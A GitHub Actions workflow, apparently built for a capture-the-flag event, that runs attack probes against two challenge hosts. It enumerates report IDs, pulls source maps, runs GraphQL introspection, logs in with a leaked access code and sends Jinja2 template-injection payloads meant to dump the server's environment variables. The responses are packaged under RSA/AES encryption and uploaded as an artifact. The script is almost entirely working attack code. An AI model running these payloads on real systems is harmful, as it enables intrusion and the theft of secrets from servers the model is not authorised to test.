name: cyberkomi-service-offline-probe

on:
  push:
    branches: [ctf-cyberkomi-probe-20260808]
  workflow_dispatch:

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 8
    steps:
      - name: Probe challenge APIs and encrypt results
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p out/parma out/gov handoff
          P='https://task-parma-line-ce3d96e598f7b9c1.caplag-task.ru'
          G='https://task-gov-relay-a90ea5f1999a03b4.caplag-task.ru'

          # PARMA: documented client routes only, plus GraphQL introspection.
          curl -sS --connect-timeout 8 --max-time 30 -X POST -D out/parma/login.headers -o out/parma/login.json "$P/api/login" || true
          for id in $(seq 24000 24030); do
            curl -sS --connect-timeout 5 --max-time 15 -o "out/parma/report_${id}.json" "$P/api/maintenance/report/$id" || true
          done
          curl -sS --connect-timeout 8 --max-time 20 -o out/parma/dispatch-map.js.map "$P/static/dispatch-map.js.map" || true

          cat > handoff/gql_route.json <<'JSON'
          {"query":"query RouteSummary($id:ID!){route(id:$id){id status start finish visibleSequence}}","variables":{"id":"P-23"}}
          JSON
          curl -sS --connect-timeout 8 --max-time 30 -H 'Content-Type: application/json' --data-binary @handoff/gql_route.json -o out/parma/gql_route.json "$P/api/graphql" || true

          cat > handoff/gql_schema.json <<'JSON'
          {"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { kind name fields(includeDeprecated:true) { name args { name type { kind name ofType { kind name } } } type { kind name ofType { kind name } } } } } }"}
          JSON
          curl -sS --connect-timeout 8 --max-time 45 -H 'Content-Type: application/json' --data-binary @handoff/gql_schema.json -o out/parma/gql_schema.json "$P/api/graphql" || true

          # GOV: use the previous chapter's client-shipped transition code for observer access.
          curl -sS --connect-timeout 8 --max-time 30 -c handoff/gov.cookies -b handoff/gov.cookies \
            -H 'Content-Type: application/json' --data '{"code":"BUS-05-STEFAN"}' \
            -D out/gov/access.headers -o out/gov/access.json "$G/api/access" || true

          python3 - <<'PY'
          import json, pathlib
          probes={
            'arith':'{{7*7}}',
            'config':'{{config}}',
            'cycler_env':"{{ cycler.__init__.__globals__.os.environ }}",
            'joiner_env':"{{ joiner.__init__.__globals__.os.environ }}",
            'request_env':"{{ request.application.__globals__.__builtins__.__import__('os').environ }}",
          }
          for n,t in probes.items(): pathlib.Path(f'handoff/tpl_{n}.json').write_text(json.dumps({'template':t}))
          PY
          for f in handoff/tpl_*.json; do
            n=$(basename "$f" .json | sed 's/^tpl_//')
            curl -sS --connect-timeout 8 --max-time 30 -c handoff/gov.cookies -b handoff/gov.cookies \
              -H 'Content-Type: application/json' --data-binary @"$f" \
              -D "out/gov/preview_${n}.headers" -o "out/gov/preview_${n}.json" "$G/api/preview" || true
          done

          for path in api/access api/preview ws/broadcast static/gov-relay-client.js.map; do
            safe=$(echo "$path"|tr '/' '_')
            curl -sS -X OPTIONS --connect-timeout 5 --max-time 15 -D "out/gov/${safe}.options.headers" -o "out/gov/${safe}.options.body" "$G/$path" || true
          done

          # Encrypt output; public Actions log contains no challenge secrets/codes from responses.
          cat > handoff/output_public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAqvptF4aTPzGzR6fNOtz3
          p/Ds9uFcANf/SCwSCWZEqbNmMGqmMYOexJISES2kjQJqiPoovpFrr4bawgr9zw7y
          sSxNcsP9lbuOdMKEU+tVS+2TebLPXMv4Ue8yX5ZhWdK3c9uz3RZHW8oWLTWgUBlC
          N7NDHSJDqeFJm4NFxBUYfVwYzxU2uD6m8r1B3FZrz/YGmMsMQFV5gWqTdiAmtosu
          uSxUJ1891V9Qd4URX4TGbkGGAE+aSSNF1WTykdECOSZmrspbu5C48489D94iaDyU
          4y+NlouCIV6/DGoJvd6VSp3SwZTTNShPQ2YKhnvRN75g7Sm++9RYeipo7xmrOBIZ
          bbyjuSC9Nd6Vy99R40e38UMAFzDUXKq5GjCBNMdA3VxrMSvs+LFeKQ77rB6h7EkX
          xVHeZPvwwV6lYUQ1i7DnLRLlz4mVqVGVa2hifx9VY2PM/M2c5/iA0uHEWQkxZ9F1
          YSb2e96Ws1+dS0tHu4hzArM8lZQEaHveFLsIu67isD0/AgMBAAE=
          -----END PUBLIC KEY-----
          PEM
          tar -C out -czf handoff/results.tar.gz .
          openssl rand 32 > handoff/key; openssl rand 16 > handoff/iv
          openssl enc -aes-256-ctr -K "$(xxd -p -c256 handoff/key)" -iv "$(xxd -p -c256 handoff/iv)" -in handoff/results.tar.gz -out handoff/results.enc
          cat handoff/key handoff/iv > handoff/keyblob
          openssl pkeyutl -encrypt -pubin -inkey handoff/output_public.pem -in handoff/keyblob -out handoff/keyblob.enc -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256
          rm -rf out handoff/key handoff/iv handoff/keyblob handoff/results.tar.gz handoff/output_public.pem handoff/gov.cookies handoff/*.json
          echo 'Scoped challenge probes complete; responses are encrypted.'
      - name: Upload encrypted result
        uses: actions/upload-artifact@v4
        with:
          name: cyberkomi-service-probe-encrypted
          path: |
            handoff/results.enc
            handoff/keyblob.enc
          retention-days: 1
